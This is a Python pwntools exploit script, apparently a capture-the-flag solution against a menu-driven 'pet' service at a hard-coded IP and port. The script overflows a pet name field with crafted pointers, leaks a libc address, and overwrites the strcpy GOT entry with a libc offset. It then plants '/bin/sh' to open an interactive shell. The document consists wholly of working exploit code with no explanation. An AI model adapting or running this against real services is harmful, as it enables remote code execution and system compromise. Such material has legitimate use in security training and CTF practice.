from pwn import *

#s = remote('192.168.43.130',1234)
s = remote('200.200.200.105', 9898)
def do_buy(pet):
  s.recvuntil('select:')
  s.send('1\n')
  s.recvuntil('select:')
  s.send(str(pet)+'\n')
def set_pet(index,name,sound,feed):
  s.recvuntil('select:')
  s.send('4\n')
  s.recvuntil('select for set:')
  s.send(str(index)+'\n')
  s.recvuntil('name:')
  s.send(name+'\n')
  s.recvuntil('sound:')
  s.send(sound+'\n')
  s.recvuntil('feed')
  s.send(feed+'\n')
def set_name(name):
  s.recvuntil('select:')
  s.send('6\n')
  s.recvuntil('name?')
  s.send(name+'\n')
# libc leak
do_buy(1)
do_buy(2)
set_pet(1,'A'*0x20+p64(0x604040)+p64(0x8)*2,'AAAA','AAAA')
s.recvuntil('select:')
s.send('5\n')
libc = u64(s.recvuntil('2')[-10:-2]) - 0x20740
log.info('LIBC :0x%x'%libc)

# overwrite strcpy
set_pet(1,'A'*0x20+p64(0x604088)+p64(0x10)*2+p64(0x604088)*(0x68/8)+'/bin/sh\x00','AAAA','AAAA')
set_name(p64(0x45390+libc)[:-1]+'\n')
s.interactive()
